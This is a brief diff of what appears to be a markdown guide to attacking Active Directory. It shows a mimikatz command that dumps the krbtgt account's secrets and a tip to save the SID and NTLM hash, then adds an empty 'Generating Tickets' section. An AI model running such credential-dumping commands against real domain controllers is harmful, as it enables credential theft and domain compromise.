@@ -40,3 +40,10 @@ mimikatz # lsadump::lsa /inject /name:krbtgt
 
 **Note :** Copy both the SID and NTLM hash to your note pad on your DC
 
+
+
+### **Generating Tickets**
+
+```powershell
+
+```
